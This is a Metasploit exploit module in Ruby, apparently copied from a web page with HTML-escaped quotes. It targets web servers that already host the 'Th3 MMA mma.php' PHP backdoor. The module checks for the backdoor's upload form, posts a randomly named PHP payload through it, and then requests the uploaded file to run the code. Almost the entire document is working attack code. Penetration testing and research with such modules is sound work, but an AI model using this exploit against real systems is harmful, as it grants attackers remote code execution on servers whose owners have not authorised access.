# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;nokogiri&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Th3 MMA mma.php Backdoor Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits Th3 MMA mma.php Backdoor which allows an arbitrary file upload that
        leads to arbitrary code execution. This backdoor also echoes the Linux kernel version or
        operating system version because of the php_uname() function.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jay Turla <@shipcod3>&#039;,
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://blog.pages.kr/1307&#039;] # Analysis of mma.php file upload backdoor
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 10000,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;mma file uploader&#039;, {} ]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 2 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,[true, "The path of the mma.php file uploader backdoor", "/mma.php"]),
      ],self.class) # sometimes it is under host/images/mma.php so you may want to set this one
  end
 
  def has_input_name?(nodes, name)
    nodes.select { |e| e.attributes[&#039;name&#039;].value == name }.empty? ? false : true
  end
 
  def check
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    })
 
    if res
      n = ::Nokogiri::HTML(res.body)
      form = n.at(&#039;form[@id="uploader"]&#039;)
      inputs = form.search(&#039;input&#039;)
      if has_input_name?(inputs, &#039;file&#039;) && has_input_name?(inputs, &#039;_upl&#039;)
        return Exploit::CheckCode::Appears
      end
    end
 
    Exploit::CheckCode::Safe
  end
 
  def exploit
    uri = normalize_uri(target_uri.path)
    payload_name = "#{rand_text_alpha(5)}.php"
 
    print_status("#{peer} - Trying to upload #{payload_name} to mma.php Backdoor")
 
    data = Rex::MIME::Message.new
 
    data.add_part(&#039;Upload&#039;, nil, nil, &#039;form-data; name="_upl"&#039;)
    data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"file\"; filename=\"#{payload_name}\"")
    post_data = data.to_s
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => post_data
    })
 
    if res
      if res.body =~ /uplod d0n3 in SAME file/
        print_good("#{peer} - Our payload #{payload_name} has been uploaded. Calling payload...")
        register_files_for_cleanup(payload_name)
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Unable to deploy payload, server returned #{res.code}")
      end
    else
      fail_with(Failure::Unknown, &#039;Connection Timed Out&#039;)
    end
 
    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(payload_name),
      &#039;method&#039; => &#039;GET&#039;
    })
  end
end

